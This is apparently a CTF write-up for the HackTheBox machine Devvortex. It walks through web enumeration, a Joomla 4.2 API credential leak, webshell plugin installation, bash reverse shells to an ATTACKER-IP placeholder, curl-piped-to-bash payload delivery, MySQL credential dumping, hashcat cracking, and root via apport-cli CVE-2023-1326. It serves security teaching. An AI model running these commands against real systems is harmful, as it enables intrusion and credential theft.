# Devvortex 
<br/>

## Intro
Welcome to the Devvortex challenge from HackTheBox Walkthrough, here is the link to the [room](https://app.hackthebox.com/machines/Devvortex). In this challenge we will use some tools to find and  exploit a web-app vulnerability to gain initial access to the machine and then escalate our privileges to get the final flag.

To interact with the machine connect via OpenVPN using the "lab" config profile.

Whenever you feel ready press "Join the Machine"

<br/>
<br/>

## The Challenge
Before even beginning the challenge let's add the IP address in the hosts file:
```bash
sudo -- sh -c "echo 'MACHINE-IP  devvortex.htb' >> /etc/hosts"
```

Now we can start enumerating ports using nmap
```bash
nmap -sV devvortex.htb
```

The nmap scan tells us that port 22 with ssh service and 80 with http are open.

Looks like we will have to get a shell again from the webserver or get the login credentials for ssh to than do some privilege escalation in the machine.

Let's go to take a look at the website, by navigating the different pages we can notice that there is a form for contacting the company, who knows maybe we can exploit it.
Looks like this is not the way, so i went for more reconing...

Using a tool like *wfuzz* i discovered a subdomain:
```bash
wfuzz -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://devvortex.htb/ -H 'Host: FUZZ.devvortex.htb' -t 50 --hc 302
```
The subdomain is dev.devvortex.htb

I went  for the robots file as it contains all the directories that are not indexed and found quite a bit of them.
http://dev.devvortex.htb/robots.txt
```
Disallow: /administrator/
Disallow: /api/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```
I have also done a directory scan:
```bash
wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://dev.devvortex.htb/FUZZ -t 200 --hc 404,403
```
and the 2 lists compares, so seems there are not more directories to look for.

From this file we also now know that the site is using Joomla, a CMS, would be nice to know its version to check for known vulnerabilities.

What about files, beside the usual robots.txt that we have already seen, i have used *wfuzz* again:
```bash
wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt -u http://dev.devvortex.htb/FUZZ -t 200 --sc 200 
```
There are a total of 4 files found:
```
LICENSE.txt
README.txt
htaccess.txt
robots.txt
```

Viewing the README file we can see that the Joomla version is 4.2
With a quick web search i found an exploit: https://www.exploit-db.com/exploits/51334, we can download it.
Since it is written in ruby you need ruby on your machine, you can install it via apt, and install libraries with this command:
```bash
sudo gem install LIBRARY_NAME
```

Then run the exploit
```bash
ruby exploit.rb http://dev.devvortex.htb/
```
or use this
```bash
curl -v http://dev.devvortex.htb/api/index.php/v1/config/application?public=true
```
to get the JSON info from the api

Here is the username and the password:
```json
{"type":"application","id":"224","attributes":{"user":"lewis","id":224}},{"type":"application","id":"224","attributes":{"password":"P4ntherg0t1n5r3c0n##","id":224}}
```

Now we can login into the administrator page at http://dev.devvortex.htb/administrator with the credentials we have just found.

---
NO
Go into system panel on the left, templates, chose administrator template, edit the login.php file and add this:
```php
system('bash -c "bash -i >& /dev/tcp/ATTACKER-IP/1234 0>%1"');
```
---

Download this joomla PoC extension: https://github.com/p0dalirius/Joomla-webshell-plugin
Install the malicious extension, visit: 
```
http://dev.devvortex.htb/administrator/index.php?option=com_installer&view=install
```


Than on your machine run
```bash
curl -X POST 'http://dev.devvortex.htb/modules/mod_webshell/mod_webshell.php' --data "action=exec&cmd=id" 
```
```bash
curl -X POST 'http://dev.devvortex.htb/modules/mod_webshell/mod_webshell.php' --data "action=download&path=/etc/passwd" -o-
```
From the second command we know there is an user called logan as well as a mysql database.

Navigate inside the repository and execute the python script to gain a shell:
```bash
python3 console.py -t http://dev.devvortex.htb
```

Knowing the name of 1 user i tried to open the flag file:
```bash
cat /home/logan/user.txt
```
But unfortunately we do not have the permission.

This means that we have to escalate our privileges and access as logan.

The other info we know is the presence of an sql database, maybe there we can find some useful info.
Let's start by creating a more stable and interactive shell:

On your machine create a shell.sh file with this script
```bash
sh -i >& /dev/tcp/ATTACKER-IP/1234 0>&1
```
In the same directory start a webserver with python
```bash
python3 -m http.server -b ATTACKER-IP 8001
```

And in another terminal set also up a netcat listener
```bash
nc -lvnp 1234
```

Now in the shell we got from the challenge website run this to download the file, execute it and start a reverse shell connection:
```bash
curl http://ATTACKER-IP:8001/shell.sh | bash
```

Now we can apply the [usual methodology](https://github.com/Maat-Cyber/Maat-Cyber-World/blob/e64dd159f4f2b0c2eb0301ea09eafea685882185/Tips-%26-Resources/Reverse_Shell-Upgrade.md) to make an fully interactive reverse shells.

On the target machine access now the mysql database:
```bash
mysql -u lewis -p P4ntherg0t1n5r3c0n## -h localhost -D joomla
```

Now let's enumerate:
```sql
SHOW DATABASES; 
```

After a bit of time spent at enumerating and searching inside some databases and columns/rows values i found the interesting one:
```sql
SELECT * FROM sd4fg_users;
```
Here between much not interesting things we can notice the hashed password of the user called logan
```
$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIjq12 
```
We can save it in a file for later use.
Now is time to find the hash type so we can crack it, you can use an online tool like this one: https://hashes.com/en/tools/hash_identifier, we can see that the type is Blowfish.

I have decided to use Hashcat to crack this, so i searched online for the mode number corresponding to this hash type and started the tool
```bash
hashcat -a 0 -m 3200 logan_psw_hash.txt  /home/kali/Documents/rockyou.txt
```

After a couple of minutes we have the password: tequieromucho

Now back into the shell we gained before we can change user to logan and open the first flag.
```bash
su logan
```
```bash
cat /home/logan/user.txt
```
(you can also log in with ssh)
And the first flag is: REDACTED
<br/>

## Time to become root
I wanted to see if the user logan could run any binary as sudo
```bash
sudo -l -S
```
```
(ALL : ALL) /usr/bin/apport-cli
```

```bash
sudo /usr/bin/apport-cli -v
```
It is running version 2.20.11 which is vulnerable to CVE-2023-1326

To exploit it run:
```bash
sudo /usr/bin/apport-cli --file-bug
```
When prompted for an option and you have to chose the number, select any for the first 2 times;
The third prompt asks you for a letter, chose `V`
When the text editor opens write `:/bin/bash` aaand magic we are not root.

Let's retrive the last flag:
```bash
cat /root/root.txt
```

<br/>

Congratulations, you have completed the Devvortex challenge! I hope you had fun and learned something new. <br>
If you wanna see more write ups you can check the WriteUps Directory in this GitHub repo. <br>
Catch you in the next CTF 😃 <br>
